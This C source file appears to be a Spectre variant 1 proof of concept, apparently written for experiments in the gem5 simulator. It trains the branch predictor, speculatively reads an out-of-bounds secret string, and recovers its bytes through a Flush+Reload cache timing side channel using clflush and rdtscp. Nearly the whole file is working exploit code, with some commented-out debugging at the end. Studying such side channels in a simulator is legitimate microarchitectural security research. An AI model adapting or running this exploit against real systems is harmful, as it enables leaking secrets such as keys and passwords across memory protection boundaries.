#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <pthread.h> // why need pthread?
#include <errno.h>
#include <x86intrin.h>
#include <stdint.h>
#include "/root/Project/gem5/include/gem5/m5ops.h"
#include "m5_mmap.h"

#define GEM5

unsigned int arr1_size = 16;
uint8_t  arr1[16] = {1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16};
uint8_t arr2[256 * 512] ;
char * secret = "This is the secret" ;// 18 bytes
uint8_t temp = 123; // used to and the loaded memo


static __inline__ unsigned Load(int *addr){
    volatile unsigned val;
    asm __volatile__(
                  " movl (%1), %%eax \n"
		   : "=a"(val)
		   : "c"(addr)
		   : );
                  //%edx is modified by rdtsc and %esi by our code
    return (val);
}


static __inline__ unsigned LoadAndMeasure(int *addr){
    volatile unsigned val;
    asm __volatile__(
		  " mfence \n"
		  " rdtsc \n"
		  " lfence \n"
		  " movl %%eax, %%esi \n"
                  " movl (%1), %%eax \n"
		  " lfence \n"
		  " rdtsc \n"
		  " subl %%esi, %%eax"
		   : "=a"(val)
		   : "c"(addr)
		   : "%edx","%esi");
                  //%edx is modified by rdtsc and %esi by our code
    return (val);
    //We return only the lower 32 bits due to relatively low resolution
}



int main(int argc, char ** argv){
  int temp =1;
  size_t malicious_index = (size_t) (secret - (char*)arr1);

  for (int j = 0 ; j  < 256*512; ++j) arr2[j] = 1; // write data into arr2 so that no copy on write zero page on RAM

  // printf("secret is %p, arr1 is %p, arr2 is %p,malicous index is %ld \n",secret, arr1, arr2 , malicious_index);

  __sync_synchronize();
  int mytime = LoadAndMeasure(&arr2[256*512]);
  printf("hit time %d\n", mytime);
  _mm_clflush(&arr2[256*512]);
  mytime = LoadAndMeasure(&arr2[256*512]);
  printf("misstime is %d\n", mytime);

  int training_x ; 
  int x;
  int mix_i = 0;
  volatile uint8_t * addr;
  int junk = 0;
  int time1, time2;
  static int results[256];

  for (int tries = 50; tries > 0; tries--){
    for (int i = 0; i < 256; i++) _mm_clflush(&arr2[i * 512]);

    training_x = tries % arr1_size;

    for ( int t = 29;  t >= 0; t--) {
      _mm_clflush( & arr1_size); 

      for (volatile int z = 0; z < 100; z++) {} // delay

      x = ((t % 6) - 1) & ~0xFFFF; /* Set x=FFF.FF0000 if j%6==0, else x=0 */
      x = (x | (x >> 16)); /* Set x=-1 if j&6=0, else x=0 */
      x = training_x ^ (x & (malicious_index ^ training_x));
      // printf("x is %d, malicousx is %ld \n", x, malicious_index);
      if (x < arr1_size){
        temp &= arr2[arr1[x] * 512];
      }
    }
    
    __sync_synchronize();
    for (int i = 0; i < 256; i++){
      mix_i = ((i * 167) + 13) & 255;
      addr = & arr2[mix_i * 512];
      // printf("mix i is %d\n", mix_i);
      time1 = __rdtscp( & junk); /* READ TIMER */
      junk = * addr; /* MEMORY ACCESS TO TIME */
      time2 = __rdtscp( & junk) - time1; /* READ TIMER & COMPUTE ELAPSED TIME */
      
      if(mix_i == 84) printf("time 2 is %d, mixi is %d\n", time2, mix_i);
      if ((int)time2 <= 80 && mix_i != arr1[tries % arr1_size]){
        results[mix_i]++; /* cache hit - add +1 to score for this value */
      }
    }
  }



  for (int m = 0; m < 255; m++){
    if (results[m] != 0){
      printf("index is %d, char is %c, value is %d\n", m, (uint8_t)m , results[m] );
    } 
  }


  printf("done!\n");

  return 0;

}


// magic, check branch pre state, next instruction, 
// // #ifdef GEM5
// //     // m5op_addr = 0xFFFF0000;
// //     // map_m5_mem();
// //     m5_work_begin_addr(0,0);
// // #endif
//   //char c = getc(stdin);
//   printf("size is %ld\n", sizeof(arr1));
//   if (x < sizeof(arr1)){
//     Load(arr2 + 32); // won't execute it
//     // m5
//     printf("hello\n");
//   } 
// // #ifdef GEM5
// //     m5_work_end_addr(0,0);
// // #endif

//   int time=LoadAndMeasure(arr2 + 32 );
//   fprintf(stderr, "The hit time is %d\n", time);

//   time=LoadAndMeasure(arr2 );
//   fprintf(stderr, "The miss time is %d\n", time);
